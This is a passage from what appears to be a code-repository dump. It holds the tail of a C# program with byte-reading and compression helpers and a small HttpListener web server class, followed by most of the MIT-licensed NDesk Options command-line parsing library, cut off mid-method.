2);\n\t\t//if (!BitConverter.IsLittleEndian) {\n\t\t//\tArray.Reverse(rawBytes);\n\t\t//}\n\n\t\treturn BitConverter.ToUInt16(rawBytes, 0);\n\t}\n\n\tprivate static UInt32 GetDoubleWord(byte[] buffer, int offset)\n\t{\n\t\tvar rawBytes = new byte[4];\n\n\t\tArray.Copy(buffer, offset, rawBytes, 0, 4);\n\t\t//if (!BitConverter.IsLittleEndian) {\n\t\t//\tArray.Reverse(rawBytes);\n\t\t//}\n\n\t\treturn BitConverter.ToUInt32(rawBytes, 0);\n\t}\n\n\tprivate static byte[] Compress(byte[] data)\n\t{\n\t\tvar buffer = new DecompressedBuffer(data);\n\t\tvar container = new CompressedContainer(buffer);\n\t\treturn container.SerializeData();\n\t}\n\n\tprivate static byte[] Decompress(byte[] data)\n\t{\n\t\tvar container = new CompressedContainer(data);\n\t\tvar buffer = new DecompressedBuffer(container);\n\t\treturn buffer.Data;\n\t}\n}\n\n// Code inspiration from https://codehosting.net/blog/BlogEngine/post/Simple-C-Web-Server\n// and https://docs.microsoft.com/en-us/dotnet/api/system.net.httplistener\npublic class WebServer\n{\n\tprivate readonly HttpListener _listener = new HttpListener();\n\tprivate readonly Func<HttpListenerRequest, byte[]> _responderMethod;\n\n\tpublic WebServer(Func<HttpListenerRequest, byte[]> method, params string[] prefixes)\n\t{\n\t\tif (!HttpListener.IsSupported)\n\t\t\tthrow new NotSupportedException(\"Needs Windows XP SP2, Server 2003 or later.\");\n\n\t\t// URI prefixes are required, for example \"http://localhost:8080/index/\".\n\t\tif (prefixes == null || prefixes.Length == 0)\n\t\t\tthrow new ArgumentException(\"prefixes\");\n\n\t\t// A responder method is required\n\t\tif (method == null)\n\t\t\tthrow new ArgumentException(\"method\");\n\n\t\tforeach (string s in prefixes)\n\t\t\t_listener.Prefixes.Add(s);\n\n\t\t_responderMethod = method;\n\t\t_listener.Start();\n\t}\n\n\tpublic void Run()\n\t{\n\t\tThreadPool.QueueUserWorkItem((o) =>\n\t\t{\n\t\t\tConsole.WriteLine(\"Webserver running...\");\n\t\t\ttry\n\t\t\t{\n\t\t\t\twhile (_listener.IsListening)\n\t\t\t\t{\n\t\t\t\t\tThreadPool.QueueUserWorkItem((c) =>\n\t\t\t\t\t{\n\t\t\t\t\t\tvar ctx = c as HttpListenerContext;\n\t\t\t\t\t\ttry\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tbyte[] buf = _responderMethod(ctx.Request);\n\t\t\t\t\t\t\tctx.Response.ContentLength64 = buf.Length;\n\t\t\t\t\t\t\tctx.Response.OutputStream.Write(buf, 0, buf.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcatch { } // suppress any exceptions\n\t\t\t\t\t\tfinally\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t// always close the stream\n\t\t\t\t\t\t\tctx.Response.OutputStream.Close();\n\t\t\t\t\t\t}\n\t\t\t\t\t}, _listener.GetContext());\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch { } // suppress any exceptions\n\t\t});\n\t}\n\n\tpublic void Stop()\n\t{\n\t\t_listener.Stop();\n\t\t_listener.Close();\n\t}\n}\n"
        },
        {
          "name": "options.cs",
          "type": "blob",
          "size": 31.26171875,
          "content": "//\n// Options.cs\n//\n// Authors:\n//  Jonathan Pryor <jpryor@novell.com>\n//\n// Copyright (C) 2008 Novell (http://www.novell.com)\n//\n// Permission is hereby granted, free of charge, to any person obtaining\n// a copy of this software and associated documentation files (the\n// \"Software\"), to deal in the Software without restriction, including\n// without limitation the rights to use, copy, modify, merge, publish,\n// distribute, sublicense, and/or sell copies of the Software, and to\n// permit persons to whom the Software is furnished to do so, subject to\n// the following conditions:\n// \n// The above copyright notice and this permission notice shall be\n// included in all copies or substantial portions of the Software.\n// \n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n// NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE\n// LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\n// OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\n// WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n//\n\n// Compile With:\n//   gmcs -debug+ -r:System.Core Options.cs -o:NDesk.Options.dll\n//   gmcs -debug+ -d:LINQ -r:System.Core Options.cs -o:NDesk.Options.dll\n//\n// The LINQ version just changes the implementation of\n// OptionSet.Parse(IEnumerable<string>), and confers no semantic changes.\n\n//\n// A Getopt::Long-inspired option parsing library for C#.\n//\n// NDesk.Options.OptionSet is built upon a key/value table, where the\n// key is a option format string and the value is a delegate that is \n// invoked when the format string is matched.\n//\n// Option format strings:\n//  Regex-like BNF Grammar: \n//    name: .+\n//    type: [=:]\n//    sep: ( [^{}]+ | '{' .+ '}' )?\n//    aliases: ( name type sep ) ( '|' name type sep )*\n// \n// Each '|'-delimited name is an alias for the associated action.  If the\n// format string ends in a '=', it has a required value.  If the format\n// string ends in a ':', it has an optional value.  If neither '=' or ':'\n// is present, no value is supported.  `=' or `:' need only be defined on one\n// alias, but if they are provided on more than one they must be consistent.\n//\n// Each alias portion may also end with a \"key/value separator\", which is used\n// to split option values if the option accepts > 1 value.  If not specified,\n// it defaults to '=' and ':'.  If specified, it can be any character except\n// '{' and '}' OR the *string* between '{' and '}'.  If no separator should be\n// used (i.e. the separate values should be distinct arguments), then \"{}\"\n// should be used as the separator.\n//\n// Options are extracted either from the current option by looking for\n// the option name followed by an '=' or ':', or is taken from the\n// following option IFF:\n//  - The current option does not contain a '=' or a ':'\n//  - The current option requires a value (i.e. not a Option type of ':')\n//\n// The `name' used in the option format string does NOT include any leading\n// option indicator, such as '-', '--', or '/'.  All three of these are\n// permitted/required on any named option.\n//\n// Option bundling is permitted so long as:\n//   - '-' is used to start the option group\n//   - all of the bundled options are a single character\n//   - at most one of the bundled options accepts a value, and the value\n//     provided starts from the next character to the end of the string.\n//\n// This allows specifying '-a -b -c' as '-abc', and specifying '-D name=value'\n// as '-Dname=value'.\n//\n// Option processing is disabled by specifying \"--\".  All options after \"--\"\n// are returned by OptionSet.Parse() unchanged and unprocessed.\n//\n// Unprocessed options are returned from OptionSet.Parse().\n//\n// Examples:\n//  int verbose = 0;\n//  OptionSet p = new OptionSet ()\n//    .Add (\"v\", v => ++verbose)\n//    .Add (\"name=|value=\", v => Console.WriteLine (v));\n//  p.Parse (new string[]{\"-v\", \"--v\", \"/v\", \"-name=A\", \"/name\", \"B\", \"extra\"});\n//\n// The above would parse the argument string array, and would invoke the\n// lambda expression three times, setting `verbose' to 3 when complete.  \n// It would also print out \"A\" and \"B\" to standard output.\n// The returned array would contain the string \"extra\".\n//\n// C# 3.0 collection initializers are supported and encouraged:\n//  var p = new OptionSet () {\n//    { \"h|?|help\", v => ShowHelp () },\n//  };\n//\n// System.ComponentModel.TypeConverter is also supported, allowing the use of\n// custom data types in the callback type; TypeConverter.ConvertFromString()\n// is used to convert the value option to an instance of the specified\n// type:\n//\n//  var p = new OptionSet () {\n//    { \"foo=\", (Foo f) => Console.WriteLine (f.ToString ()) },\n//  };\n//\n// Random other tidbits:\n//  - Boolean options (those w/o '=' or ':' in the option format string)\n//    are explicitly enabled if they are followed with '+', and explicitly\n//    disabled if they are followed with '-':\n//      string a = null;\n//      var p = new OptionSet () {\n//        { \"a\", s => a = s },\n//      };\n//      p.Parse (new string[]{\"-a\"});   // sets v != null\n//      p.Parse (new string[]{\"-a+\"});  // sets v != null\n//      p.Parse (new string[]{\"-a-\"});  // sets v == null\n//\n\nusing System;\nusing System.Collections;\nusing System.Collections.Generic;\nusing System.Collections.ObjectModel;\nusing System.ComponentModel;\nusing System.Globalization;\nusing System.IO;\nusing System.Runtime.Serialization;\nusing System.Security.Permissions;\nusing System.Text;\nusing System.Text.RegularExpressions;\n\n#if LINQ\nusing System.Linq;\n#endif\n\n#if TEST\nusing NDesk.Options;\n#endif\n\nnamespace NDesk.Options {\n\n\tpublic class OptionValueCollection : IList, IList<string> {\n\n\t\tList<string> values = new List<string> ();\n\t\tOptionContext c;\n\n\t\tinternal OptionValueCollection (OptionContext c)\n\t\t{\n\t\t\tthis.c = c;\n\t\t}\n\n\t\t#region ICollection\n\t\tvoid ICollection.CopyTo (Array array, int index)  {(values as ICollection).CopyTo (array, index);}\n\t\tbool ICollection.IsSynchronized                   {get {return (values as ICollection).IsSynchronized;}}\n\t\tobject ICollection.SyncRoot                       {get {return (values as ICollection).SyncRoot;}}\n\t\t#endregion\n\n\t\t#region ICollection<T>\n\t\tpublic void Add (string item)                       {values.Add (item);}\n\t\tpublic void Clear ()                                {values.Clear ();}\n\t\tpublic bool Contains (string item)                  {return values.Contains (item);}\n\t\tpublic void CopyTo (string[] array, int arrayIndex) {values.CopyTo (array, arrayIndex);}\n\t\tpublic bool Remove (string item)                    {return values.Remove (item);}\n\t\tpublic int Count                                    {get {return values.Count;}}\n\t\tpublic bool IsReadOnly                              {get {return false;}}\n\t\t#endregion\n\n\t\t#region IEnumerable\n\t\tIEnumerator IEnumerable.GetEnumerator () {return values.GetEnumerator ();}\n\t\t#endregion\n\n\t\t#region IEnumerable<T>\n\t\tpublic IEnumerator<string> GetEnumerator () {return values.GetEnumerator ();}\n\t\t#endregion\n\n\t\t#region IList\n\t\tint IList.Add (object value)                {return (values as IList).Add (value);}\n\t\tbool IList.Contains (object value)          {return (values as IList).Contains (value);}\n\t\tint IList.IndexOf (object value)            {return (values as IList).IndexOf (value);}\n\t\tvoid IList.Insert (int index, object value) {(values as IList).Insert (index, value);}\n\t\tvoid IList.Remove (object value)            {(values as IList).Remove (value);}\n\t\tvoid IList.RemoveAt (int index)             {(values as IList).RemoveAt (index);}\n\t\tbool IList.IsFixedSize                      {get {return false;}}\n\t\tobject IList.this [int index]               {get {return this [index];} set {(values as IList)[index] = value;}}\n\t\t#endregion\n\n\t\t#region IList<T>\n\t\tpublic int IndexOf (string item)            {return values.IndexOf (item);}\n\t\tpublic void Insert (int index, string item) {values.Insert (index, item);}\n\t\tpublic void RemoveAt (int index)            {values.RemoveAt (index);}\n\n\t\tprivate void AssertValid (int index)\n\t\t{\n\t\t\tif (c.Option == null)\n\t\t\t\tthrow new InvalidOperationException (\"OptionContext.Option is null.\");\n\t\t\tif (index >= c.Option.MaxValueCount)\n\t\t\t\tthrow new ArgumentOutOfRangeException (\"index\");\n\t\t\tif (c.Option.OptionValueType == OptionValueType.Required &&\n\t\t\t\t\tindex >= values.Count)\n\t\t\t\tthrow new OptionException (string.Format (\n\t\t\t\t\t\t\tc.OptionSet.MessageLocalizer (\"Missing required value for option '{0}'.\"), c.OptionName), \n\t\t\t\t\t\tc.OptionName);\n\t\t}\n\n\t\tpublic string this [int index] {\n\t\t\tget {\n\t\t\t\tAssertValid (index);\n\t\t\t\treturn index >= values.Count ? null : values [index];\n\t\t\t}\n\t\t\tset {\n\t\t\t\tvalues [index] = value;\n\t\t\t}\n\t\t}\n\t\t#endregion\n\n\t\tpublic List<string> ToList ()\n\t\t{\n\t\t\treturn new List<string> (values);\n\t\t}\n\n\t\tpublic string[] ToArray ()\n\t\t{\n\t\t\treturn values.ToArray ();\n\t\t}\n\n\t\tpublic override string ToString ()\n\t\t{\n\t\t\treturn string.Join (\", \", values.ToArray ());\n\t\t}\n\t}\n\n\tpublic class OptionContext {\n\t\tprivate Option                option;\n\t\tprivate string                name;\n\t\tprivate int                   index;\n\t\tprivate OptionSet             set;\n\t\tprivate OptionValueCollection c;\n\n\t\tpublic OptionContext (OptionSet set)\n\t\t{\n\t\t\tthis.set = set;\n\t\t\tthis.c   = new OptionValueCollection (this);\n\t\t}\n\n\t\tpublic Option Option {\n\t\t\tget {return option;}\n\t\t\tset {option = value;}\n\t\t}\n\n\t\tpublic string OptionName { \n\t\t\tget {return name;}\n\t\t\tset {name = value;}\n\t\t}\n\n\t\tpublic int OptionIndex {\n\t\t\tget {return index;}\n\t\t\tset {index = value;}\n\t\t}\n\n\t\tpublic OptionSet OptionSet {\n\t\t\tget {return set;}\n\t\t}\n\n\t\tpublic OptionValueCollection OptionValues {\n\t\t\tget {return c;}\n\t\t}\n\t}\n\n\tpublic enum OptionValueType {\n\t\tNone, \n\t\tOptional,\n\t\tRequired,\n\t}\n\n\tpublic abstract class Option {\n\t\tstring prototype, description;\n\t\tstring[] names;\n\t\tOptionValueType type;\n\t\tint count;\n\t\tstring[] separators;\n\n\t\tprotected Option (string prototype, string description)\n\t\t\t: this (prototype, description, 1)\n\t\t{\n\t\t}\n\n\t\tprotected Option (string prototype, string description, int maxValueCount)\n\t\t{\n\t\t\tif (prototype == null)\n\t\t\t\tthrow new ArgumentNullException (\"prototype\");\n\t\t\tif (prototype.Length == 0)\n\t\t\t\tthrow new ArgumentException (\"Cannot be the empty string.\", \"prototype\");\n\t\t\tif (maxValueCount < 0)\n\t\t\t\tthrow new ArgumentOutOfRangeException (\"maxValueCount\");\n\n\t\t\tthis.prototype   = prototype;\n\t\t\tthis.names       = prototype.Split ('|');\n\t\t\tthis.description = description;\n\t\t\tthis.count       = maxValueCount;\n\t\t\tthis.type        = ParsePrototype ();\n\n\t\t\tif (this.count == 0 && type != OptionValueType.None)\n\t\t\t\tthrow new ArgumentException (\n\t\t\t\t\t\t\"Cannot provide maxValueCount of 0 for OptionValueType.Required or \" +\n\t\t\t\t\t\t\t\"OptionValueType.Optional.\",\n\t\t\t\t\t\t\"maxValueCount\");\n\t\t\tif (this.type == OptionValueType.None && maxValueCount > 1)\n\t\t\t\tthrow new ArgumentException (\n\t\t\t\t\t\tstring.Format (\"Cannot provide maxValueCount of {0} for OptionValueType.None.\", maxValueCount),\n\t\t\t\t\t\t\"maxValueCount\");\n\t\t\tif (Array.IndexOf (names, \"<>\") >= 0 && \n\t\t\t\t\t((names.Length == 1 && this.type != OptionValueType.None) ||\n\t\t\t\t\t (names.Length > 1 && this.MaxValueCount > 1)))\n\t\t\t\tthrow new ArgumentException (\n\t\t\t\t\t\t\"The default option handler '<>' cannot require values.\",\n\t\t\t\t\t\t\"prototype\");\n\t\t}\n\n\t\tpublic string           Prototype       {get {return prototype;}}\n\t\tpublic string           Description     {get {return description;}}\n\t\tpublic OptionValueType  OptionValueType {get {return type;}}\n\t\tpublic int              MaxValueCount   {get {return count;}}\n\n\t\tpublic string[] GetNames ()\n\t\t{\n\t\t\treturn (string[]) names.Clone ();\n\t\t}\n\n\t\tpublic string[] GetValueSeparators ()\n\t\t{\n\t\t\tif (separators == null)\n\t\t\t\treturn new string [0];\n\t\t\treturn (string[]) separators.Clone ();\n\t\t}\n\n\t\tprotected static T Parse<T> (string value, OptionContext c)\n\t\t{\n\t\t\tTypeConverter conv = TypeDescriptor.GetConverter (typeof (T));\n\t\t\tT t = default (T);\n\t\t\ttry {\n\t\t\t\tif (value != null)\n\t\t\t\t\tt = (T) conv.ConvertFromString (value);\n\t\t\t}\n\t\t\tcatch (Exception e) {\n\t\t\t\tthrow new OptionException (\n\t\t\t\t\t\tstring.Format (\n\t\t\t\t\t\t\tc.OptionSet.MessageLocalizer (\"Could not convert string `{0}' to type {1} for option `{2}'.\"),\n\t\t\t\t\t\t\tvalue, typeof (T).Name, c.OptionName),\n\t\t\t\t\t\tc.OptionName, e);\n\t\t\t}\n\t\t\treturn t;\n\t\t}\n\n\t\tinternal string[] Names           {get {return names;}}\n\t\tinternal string[] ValueSeparators {get {return separators;}}\n\n\t\tstatic readonly char[] NameTerminator = new char[]{'=', ':'};\n\n\t\tprivate OptionValueType ParsePrototype ()\n\t\t{\n\t\t\tchar type = '\\0';\n\t\t\tList<string> seps = new List<string> ();\n\t\t\tfor (int i = 0; i < names.Length; ++i) {\n\t\t\t\tstring name = names [i];\n\t\t\t\tif (name.Length == 0)\n\t\t\t\t\tthrow new ArgumentException (\"Empty option names are not supported.\", \"prototype\");\n\n\t\t\t\tint end = name.IndexOfAny (NameTerminator);\n\t\t\t\tif (end == -1)\n\t\t\t\t\tcontinue;\n\t\t\t\tnames [i] = name.Substring (0, end);\n\t\t\t\tif (type == '\\0' || type == name [end])\n\t\t\t\t\ttype = name [end];\n\t\t\t\telse \n\t\t\t\t\tthrow new ArgumentException (\n\t\t\t\t\t\t\tstring.Format (\"Conflicting option types: '{0}' vs. '{1}'.\", type, name [end]),\n\t\t\t\t\t\t\t\"prototype\");\n\t\t\t\tAddSeparators (name, end, seps);\n\t\t\t}\n\n\t\t\tif (type == '\\0')\n\t\t\t\treturn OptionValueType.None;\n\n\t\t\tif (count <= 1 && seps.Count != 0)\n\t\t\t\tthrow new ArgumentException (\n\t\t\t\t\t\tstring.Format (\"Cannot provide key/value separators for Options taking {0} value(s).\", count),\n\t\t\t\t\t\t\"prototype\");\n\t\t\tif (count > 1) {\n\t\t\t\tif (seps.Count == 0)\n\t\t\t\t\tthis.separators = new string[]{\":\", \"=\"};\n\t\t\t\telse if (seps.Count == 1 && seps [0].Length == 0)\n\t\t\t\t\tthis.separators = null;\n\t\t\t\telse\n\t\t\t\t\tthis.separators = seps.ToArray ();\n\t\t\t}\n\n\t\t\treturn type == '=' ? OptionValueType.Required : OptionValueType.Optional;\n\t\t}\n\n\t\tprivate static void AddSeparators (string name, int end, ICollection<string> seps)\n\t\t{\n\t\t\tint start = -1;\n\t\t\tfor (int i = end+1; i < name.Length; ++i) {\n\t\t\t\tswitch (name [i]) {\n\t\t\t\t\tcase '{':\n\t\t\t\t\t\tif (start != -1)\n\t\t\t\t\t\t\tthrow new ArgumentException (\n\t\t\t\t\t\t\t\t\tstring.Format (\"Ill-formed name/value separator found in \\\"{0}\\\".\", name),\n\t\t\t\t\t\t\t\t\t\"prototype\");\n\t\t\t\t\t\tstart = i+1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase '}':\n\t\t\t\t\t\tif (start == -1)\n\t\t\t\t\t\t\tthrow new ArgumentException (\n\t\t\t\t\t\t\t\t\tstring.Format (\"Ill-formed name/value separator found in \\\"{0}\\\".\", name),\n\t\t\t\t\t\t\t\t\t\"prototype\");\n\t\t\t\t\t\tseps.Add (name.Substring (start, i-start));\n\t\t\t\t\t\tstart = -1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tif (start == -1)\n\t\t\t\t\t\t\tseps.Add (name [i].ToString ());\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (start != -1)\n\t\t\t\tthrow new ArgumentException (\n\t\t\t\t\t\tstring.Format (\"Ill-formed name/value separator found in \\\"{0}\\\".\", name),\n\t\t\t\t\t\t\"prototype\");\n\t\t}\n\n\t\tpublic void Invoke (OptionContext c)\n\t\t{\n\t\t\tOnParseComplete (c);\n\t\t\tc.OptionName  = null;\n\t\t\tc.Option      = null;\n\t\t\tc.OptionValues.Clear ();\n\t\t}\n\n\t\tprotected abstract void OnParseComplete (OptionContext c);\n\n\t\tpublic override string ToString ()\n\t\t{\n\t\t\treturn Prototype;\n\t\t}\n\t}\n\n\t[Serializable]\n\tpublic class OptionException : Exception {\n\t\tprivate string option;\n\n\t\tpublic OptionException ()\n\t\t{\n\t\t}\n\n\t\tpublic OptionException (string message, string optionName)\n\t\t\t: base (message)\n\t\t{\n\t\t\tthis.option = optionName;\n\t\t}\n\n\t\tpublic OptionException (string message, string optionName, Exception innerException)\n\t\t\t: base (message, innerException)\n\t\t{\n\t\t\tthis.option = optionName;\n\t\t}\n\n\t\tprotected OptionException (SerializationInfo info, StreamingContext context)\n\t\t\t: base (info, context)\n\t\t{\n\t\t\tthis.option = info.GetString (\"OptionName\");\n\t\t}\n\n\t\tpublic string OptionName {\n\t\t\tget {return this.option;}\n\t\t}\n\n\t\t[SecurityPermission (SecurityAction.LinkDemand, SerializationFormatter = true)]\n\t\tpublic override void GetObjectData (SerializationInfo info, StreamingContext context)\n\t\t{\n\t\t\tbase.GetObjectData (info, context);\n\t\t\tinfo.AddValue (\"OptionName\", option);\n\t\t}\n\t}\n\n\tpublic delegate void OptionAction<TKey, TValue> (TKey key, TValue value);\n\n\tpublic class OptionSet : KeyedCollection<string, Option>\n\t{\n\t\tpublic OptionSet ()\n\t\t\t: this (delegate (string f) {return f;})\n\t\t{\n\t\t}\n\n\t\tpublic OptionSet (Converter<string, string> localizer)\n\t\t{\n\t\t\tthis.localizer = localizer;\n\t\t}\n\n\t\tConverter<string, string> localizer;\n\n\t\tpublic Converter<string, string> MessageLocalizer {\n\t\t\tget {return localizer;}\n\t\t}\n\n\t\tprotected override string GetKeyForItem (Option item)\n\t\t{\n\t\t\tif (item == null)\n\t\t\t\tthrow new ArgumentNullException (\"option\");\n\t\t\tif (item.Names != null && item.Names.Length > 0)\n\t\t\t\treturn item.Names [0];\n\t\t\t// This should never happen, as it's invalid for Option to be\n\t\t\t// constructed w/o any names.\n\t\t\tthrow new InvalidOperationException (\"Option has no names!\");\n\t\t}\n\n\t\t[Obsolete (\"Use KeyedCollection.this[string]\")]\n\t\tprotected Option GetOptionForName (string option)\n\t\t{\n\t\t\tif (option == null)\n\t\t\t\tthrow new ArgumentNullException (\"option\");\n\t\t\ttry {\n\t\t\t\treturn base [option];\n\t\t\t}\n\t\t\tcatch (KeyNotFoundException) {\n\t\t\t\treturn null;\n\t\t\t}\n\t\t}\n\n\t\tprotected override void InsertItem (int index, Option item)\n\t\t{\n\t\t\tbase.InsertItem (index, item);\n\t\t\tAddImpl (item);\n\t\t}\n\n\t\tprotected override void RemoveItem (int index)\n\t\t{\n\t\t\tbase.RemoveItem (index);\n\t\t\tOption p = Items [index];\n\t\t\t// KeyedCollection.RemoveItem() handles the 0th item\n\t\t\tfor (int i = 1; i < p.Names.Length; ++i) {\n\t\t\t\tDictionary.Remove (p.Names [i]);\n\t\t\t}\n\t\t}\n\n\t\tprotected override void SetItem (int index, Option item)\n\t\t{\n\t\t\tbase.SetItem (index, item);\n\t\t\tRemoveItem (index);\n\t\t\tAddImpl (item);\n\t\t}\n\n\t\tprivate void AddImpl (Option option)\n\t\t{\n\t\t\tif (option == null)\n\t\t\t\tthrow new ArgumentNullException (\"option\");\n\t\t\tList<string> added = new List<string> (option.Names.Length);\n\t\t\ttry {\n\t\t\t\t// KeyedCollection.InsertItem/SetItem handle the 0th name.\n\t\t\t\tfor (int i = 1; i < option.Names.Length; ++i) {\n\t\t\t\t\tDictionary.Add (option.Names [i], option);\n\t\t\t\t\tadded.Add (option.Names [i]);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch (Exception) {\n\t\t\t\tforeach (string name in added)\n\t\t\t\t\tDictionary.Remove (name);\n\t\t\t\tthrow;\n\t\t\t}\n\t\t}\n\n\t\tpublic new OptionSet Add (Option option)\n\t\t{\n\t\t\tbase.Add (option);\n\t\t\treturn this;\n\t\t}\n\n\t\tsealed class ActionOption : Option {\n\t\t\tAction<OptionValueCollection> action;\n\n\t\t\tpublic ActionOption (string prototype, string description, int count, Action<OptionValueCollection> action)\n\t\t\t\t: base (prototype, description, count)\n\t\t\t{\n\t\t\t\tif (action == null)\n\t\t\t\t\tthrow new ArgumentNullException (\"action\");\n\t\t\t\tthis.action = action;\n\t\t\t}\n\n\t\t\tprotected override void OnParseComplete (OptionContext c)\n\t\t\t{\n\t\t\t\taction (c.OptionValues);\n\t\t\t}\n\t\t}\n\n\t\tpublic OptionSet Add (string prototype, Action<string> action)\n\t\t{\n\t\t\treturn Add (prototype, null, action);\n\t\t}\n\n\t\tpublic OptionSet Add (string prototype, string description, Action<string> action)\n\t\t{\n\t\t\tif (action == null)\n\t\t\t\tthrow new ArgumentNullException (\"action\");\n\t\t\tOption p = new ActionOption (prototype, description, 1, \n\t\t\t\t\tdelegate (OptionValueCollection v) { action (v [0]); });\n\t\t\tbase.Add (p);\n\t\t\treturn this;\n\t\t}\n\n\t\tpublic OptionSet Add (string prototype, OptionAction<string, string> action)\n\t\t{\n\t\t\treturn Add (prototype, null, action);\n\t\t}\n\n\t\tpublic OptionSet Add (string prototype, string description, OptionAction<string, string> action)\n\t\t{\n\t\t\tif (action == null)\n\t\t\t\tthrow new ArgumentNullException (\"action\");\n\t\t\tOption p = new ActionOption (prototype, description, 2, \n\t\t\t\t\tdelegate (OptionValueCollection v) {action (v [0], v [1]);});\n\t\t\tbase.Add (p);\n\t\t\treturn this;\n\t\t}\n\n\t\tsealed class ActionOption<T> : Option {\n\t\t\tAction<T> action;\n\n\t\t\tpublic ActionOption (string prototype, string description, Action<T> action)\n\t\t\t\t: base (prototype, description, 1)\n\t\t\t{\n\t\t\t\tif (action == null)\n\t\t\t\t\tthrow new ArgumentNullException (\"action\");\n\t\t\t\tthis.action = action;\n\t\t\t}\n\n\t\t\tprotected override void OnParseComplete (OptionContext c)\n\t\t\t{\n\t\t\t\taction (Parse<T> (c.OptionValues [0], c));\n\t\t\t}\n\t\t}\n\n\t\tsealed class ActionOption<TKey, TValue> : Option {\n\t\t\tOptionAction<TKey, TValue> action;\n\n\t\t\tpublic ActionOption (string prototype, string description, OptionAction<TKey, TValue> action)\n\t\t\t\t: base (prototype, description, 2)\n\t\t\t{\n\t\t\t\tif (action == null)\n\t\t\t\t\tthrow new ArgumentNullException (\"action\");\n\t\t\t\tthis.action = action;\n\t\t\t}\n\n\t\t\tprotected override void OnParseComplete (OptionContext c)\n\t\t\t{\n\t\t\t\taction (\n\t\t\t\t\t\tParse<TKey> (c.OptionValues [0], c),\n\t\t\t\t\t\tParse<TValue> (c.OptionValues [1], c));\n\t\t\t}\n\t\t}\n\n\t\tpublic OptionSet Add<T> (string prototype, Action<T> action)\n\t\t{\n\t\t\treturn Add (prototype, null, action);\n\t\t}\n\n\t\tpublic OptionSet Add<T> (string prototype, string description, Action<T> action)\n\t\t{\n\t\t\treturn Add (new ActionOption<T> (prototype, description, action));\n\t\t}\n\n\t\tpublic OptionSet Add<TKey, TValue> (string prototype, OptionAction<TKey, TValue> action)\n\t\t{\n\t\t\treturn Add (prototype, null, action);\n\t\t}\n\n\t\tpublic OptionSet Add<TKey, TValue> (string prototype, string description, OptionAction<TKey, TValue> action)\n\t\t{\n\t\t\treturn Add (new ActionOption<TKey, TValue> (prototype, description, action));\n\t\t}\n\n\t\tprotected virtual OptionContext CreateOptionContext ()\n\t\t{\n\t\t\treturn new OptionContext (this);\n\t\t}\n\n#if LINQ\n\t\tpublic List<string> Parse (IEnumerable<string> arguments)\n\t\t{\n\t\t\tbool process = true;\n\t\t\tOptionContext c = CreateOptionContext ();\n\t\t\tc.OptionIndex = -1;\n\t\t\tvar def = GetOptionForName (\"<>\");\n\t\t\tvar unprocessed = \n\t\t\t\tfrom argument in arguments\n\t\t\t\twhere ++c.OptionIndex >= 0 && (process || def != null)\n\t\t\t\t\t? process\n\t\t\t\t\t\t? argument == \"--\" \n\t\t\t\t\t\t\t? (process = false)\n\t\t\t\t\t\t\t: !Parse (argument, c)\n\t\t\t\t\t\t\t\t? def != null \n\t\t\t\t\t\t\t\t\t? Unprocessed (null, def, c, argument) \n\t\t\t\t\t\t\t\t\t: true\n\t\t\t\t\t\t\t\t: false\n\t\t\t\t\t\t: def != null \n\t\t\t\t\t\t\t? Unprocessed (null, def, c, argument)\n\t\t\t\t\t\t\t: true\n\t\t\t\t\t: true\n\t\t\t\tselect argument;\n\t\t\tList<string> r = unprocessed.ToList ();\n\t\t\tif (c.Option != null)\n\t\t\t\tc.Option.Invoke (c);\n\t\t\treturn r;\n\t\t}\n#else\n\t\tpublic List<string> Parse (IEnumerable<string> arguments)\n\t\t{\n\t\t\tOptionContext c = CreateOptionContext ();\n\t\t\tc.OptionIndex = -1;\n\t\t\tbool process = true;\n\t\t\tList<string> unprocessed = new List<string> ();\n\t\t\tOption def = Contains (\"<>\") ? this [\"<>\"] : null;\n\t\t\tforeach (string argument in arguments) {\n\t\t\t\t++c.OptionIndex;\n\t\t\t\tif (argument == \"--\") {\n\t\t\t\t\tprocess = false;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tif (!process) {\n\t\t\t\t\tUnprocessed (unprocessed, def, c, argument);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tif (!Parse (argument, c))\n\t\t\t\t\tUnprocessed (unprocessed, def, c, argument);\n\t\t\t}\n\t\t\tif (c.Option != null)\n\t\t\t\tc.Option.Invoke (c);\n\t\t\treturn unprocessed;\n\t\t}\n#endif\n\n\t\tprivate static bool Unprocessed (ICollection<string> extra, Option def, OptionContext c, string argument)\n\t\t{\n\t\t\tif (def == null) {\n\t\t\t\textra.Add (argument);\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tc.OptionValues.Add (argument);\n\t\t\tc.Option = def;\n\t\t\tc.Option.Invoke (c);\n\t\t\treturn false;\n\t\t}\n\n\t\tprivate readonly Regex ValueOption = new Regex (\n\t\t\t@\"^(?<flag>--|-|/)(?<name>[^:=]+)((?<sep>[:=])(?<value>.*))?$\");\n\n\t\tprotected bool GetOptionParts (string argument, out string flag, out string name, out string sep, out string value)\n\t\t{\n\t\t\tif (argument == null)\n\t\t\t\tthrow new ArgumentNullException (\"argument\");\n\n\t\t\tflag = name = sep = value = null;\n\t\t\tMatch m = ValueOption.Match (argument);\n\t\t\tif (!m.Success) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tflag  = m.Groups [\"flag\"].Value;\n\t\t\tname  = m.Groups [\"name\"].Value;\n\t\t\tif (m.Groups [\"sep\"].Success && m.Groups [\"value\"].Success) {\n\t\t\t\tsep   = m.Groups 